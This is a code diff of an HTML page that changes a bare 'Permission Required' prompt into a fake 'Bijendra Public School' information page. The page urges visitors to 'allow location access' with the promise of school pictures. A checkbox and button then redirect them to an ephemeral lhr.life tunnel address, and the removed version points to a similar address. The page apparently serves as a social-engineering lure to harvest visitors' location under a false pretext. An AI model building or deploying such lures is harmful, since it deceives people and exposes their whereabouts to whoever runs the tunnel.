@@ -2,64 +2,103 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Permission Required</title>
+    <title>Bijendra Public School</title>
+
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background: linear-gradient(135deg, #eef2f3, #d9e4f5);
+            margin: 0;
+            padding: 0;
         }
 
-        .box {
+        .container {
+            max-width: 800px;
+            margin: 60px auto;
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            width: 400px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #1f3c88;
+        }
+
+        p {
+            line-height: 1.7;
+            color: #333;
+        }
+
+        .note {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f7f9fc;
+            border-left: 5px solid #1f3c88;
+        }
+
+        .confirm {
+            margin-top: 20px;
         }
 
         button {
-            padding: 10px 20px;
+            margin-top: 25px;
+            padding: 12px 30px;
             font-size: 16px;
+            background-color: #1f3c88;
+            color: white;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
-            margin-top: 15px;
         }
 
         button:disabled {
-            opacity: 0.5;
+            background-color: #999;
             cursor: not-allowed;
         }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>Permission Required</h2>
+<div class="container">
 
-    <p>Please visit the following link and allow access:</p>
+    <h1>Bijendra Public School</h1>
 
     <p>
-        <a href="https://0ff7986846457a.lhr.life" target="_blank">
-            https://0ff7986846457a.lhr.life
-        </a>
+        Bijendra Public School is a well-known educational institution focused on providing
+        quality education with strong moral values. The school emphasizes academic excellence,
+        discipline, and overall personality development of students.
     </p>
 
-    <label>
-        <input type="checkbox" id="allowCheck">
-        I have allowed and want to continue
-    </label>
+    <p>
+        With experienced teachers, a structured curriculum, and a supportive learning
+        environment, the school aims to prepare students not only for examinations, but for
+        real-world challenges. Along with academics, students are encouraged to participate in
+        cultural activities, sports, and creative learning.
+    </p>
 
-    <br>
+    <div class="note">
+        <strong>Before we continue:</strong>
+        <p>
+            Please open the school location and allow location access.
+            Once you allow it, I’ll be able to show you real pictures and visuals of the school
+            surroundings for a better experience.
+        </p>
+    </div>
 
-    <button id="nextBtn" disabled>Go to Next Page</button>
+    <div class="confirm">
+        <label>
+            <input type="checkbox" id="agree">
+            I have opened the location and allowed access
+        </label>
+    </div>
+
+    <button id="nextBtn" disabled>Next</button>
+
 </div>
 
 <script>
-    const checkbox = document.getElementById("allowCheck");
+    const checkbox = document.getElementById("agree");
     const button = document.getElementById("nextBtn");
 
     checkbox.addEventListener("change", function () {
@@ -67,8 +106,7 @@
     });
 
     button.addEventListener("click", function () {
-        window.location.href = "nextpage.html"; 
-        // replace with your actual next page URL
+        window.location.href = "https://a7ff2a651c4269.lhr.life";
     });
 </script>
 
